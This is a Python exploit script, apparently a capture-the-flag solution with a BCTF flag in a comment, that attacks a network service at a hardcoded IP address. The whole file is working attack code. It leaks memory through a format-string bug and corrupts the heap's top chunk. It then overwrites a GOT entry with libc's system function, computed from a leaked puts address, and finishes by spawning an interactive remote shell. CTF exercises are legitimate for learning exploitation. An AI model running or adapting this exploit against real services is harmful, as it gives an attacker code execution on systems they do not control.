#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re

host = "166.111.132.49"
port = 9999

sock = make_conn(host,port)

# BCTF{H0w_3lf_Ru1n3d_XmaS}
def leak(addr):
    recvuntil(sock,"choice(1-4):")
    payload = "%6$s"
    payload += pack32(addr)
    sendline(sock,payload)

    data = recvuntil(sock,"wrong choice")
    return data.split("\n")[0].ljust(4,"\x00")[:4]

recvuntil(sock,":")
sock.send("a"*8)
data = recvuntil(sock,"wrong")
heapptr = unpack32(data[8:12])
if (heapptr & 0xff000000) == 0x20000000 :
    heapptr = heapptr & 0xffffff
heap = heapptr - 0x8
print hex(heap)
top = heap + 0x14-0x8
sock.send("security")

recvuntil(sock,"choice(1-4):")
sendline(sock,"2")
recvuntil(sock,":")
sendline(sock,"a"*12 + pack32(0xffffffff))
nb = 0x10fb0-8 - 4 - top - 8
print nb

recvuntil(sock,"choice(1-4):")
sendline(sock,"3")
recvuntil(sock,":")
sendline(sock,str(nb))
recvuntil(sock,"choice(1-4):")
sendline(sock,"1")
payload = pack32(0)
payload += pack32(0x10f80)
payload += pack32(0)
payload += pack32(0)

sock.send(payload)

recvuntil(sock,"choice(1-4):")
sendline(sock,"2")
recvuntil(sock,":")
sendline(sock,pack32(0x8594))

puts = unpack32(leak(0x10f6c)) #putgot
print hex(puts)

libc = puts - 0x5fba0
system = libc + 0x3a8b8

sendline(sock,"s")
recvuntil(sock,":")
sendline(sock,pack32(system))
sendline(sock,"sh")
inter(sock)
